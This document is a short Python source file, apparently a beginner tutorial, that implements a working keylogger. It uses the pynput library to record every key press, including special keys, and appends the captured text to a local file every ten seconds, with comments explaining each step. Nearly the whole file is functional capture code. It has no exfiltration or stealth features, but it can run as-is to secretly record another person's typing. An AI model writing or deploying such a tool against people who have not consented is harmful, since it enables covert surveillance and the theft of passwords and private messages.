#simple_keylogger.py
import pynput.keyboard #for capturing keyboard input
import threading #for managing threads
import os # for file handling

#global variable to store the keystrokes
log = ""

#This function is called every time a key is pressed
def callback(key):
    global log # access the global 'log' variable to store key presses
    try:
        #If key is a regular character (e.g., a letter or number ), add it to the log
        log += key.char
    except AttributeError:
        # if the key is a special key (e.g., space, enter), handle accordingly 
        if key == key.space:
            log += " " #Add a space when the spacebar is pressed
        else:
            #For other special keys, such as shift, crlt, ect., represent them with (key)
            log += f"[{key}] "

# This function is used to periodically save the keystrokes to a text file
def report():
    global log #Access the global 'log' variables to save th ketstrokes
    #Open the file 'keylog.txt' in append mode so that the logs don't overwrite each other
    with open("keylogs.txt", "a") as file:
        file.write(log) #Write the current log to the file
    log = "" #Clear the log after saving
    #Call the report function every 10 seconds to save the keystrokes
    threading.Timer(10, report).start()

# Start listening for keyboard input using the pynput library
keyboard_listener = pynput.keyboard.Listener(on_press=callback)

# Using a context manager to start and stop the listene
with keyboard_listener:
    report() #Start saving logs periodically
    keyboard_listener.join() # Keep the program running and listening for key event

    